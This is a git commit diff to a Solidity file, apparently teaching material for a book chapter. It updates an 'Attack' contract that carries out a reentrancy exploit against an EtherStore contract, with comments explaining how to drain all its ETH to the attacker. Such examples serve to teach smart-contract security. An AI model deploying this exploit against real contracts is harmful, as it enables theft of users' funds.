0d4a649a3a9654d3d0330384f73e1c6f5fd2a78d
Warodom Werapun <wwarodom@gmail.com>
2024-03-02 12:04:10 +0700

    Update SourceCode6_2.sol

--- Chapter6/SourceCode6_2.sol
+++ Chapter6/SourceCode6_2.sol
@@ -1,6 +1,14 @@
 // SPDX-License-Identifier: MIT
 
+import "contracts/EtherStore.sol";
+
 pragma solidity 0.8.20;
+
+// Deploy EtherStore and deposit to EtherStore first
+// Deploy Attack with Etherstore contract address
+// Check getBalance() from EtherStore to check AttackContract Balance
+// Go attack() with 1 ETH (msg.value) deposit to steal all ETH from EtherStore
+// Verify getBalance() from Attack contract that got all fund
 
 contract Attack {
     EtherStore public etherStore;
@@ -12,18 +20,22 @@ contract Attack {
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
-            etherStore.withdraw(1 ether);
+            etherStore.withdraw();
         }
     }
 
     function attack() external payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
-        etherStore.withdraw(1 ether);
+        etherStore.withdraw();
     }
 
     // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
+    function getBalance() public view returns (uint256) {
         return address(this).balance;
+    }
+
+    function withdraw() public {
+        payable(address(msg.sender)).transfer(address(this).balance);
     }
 }
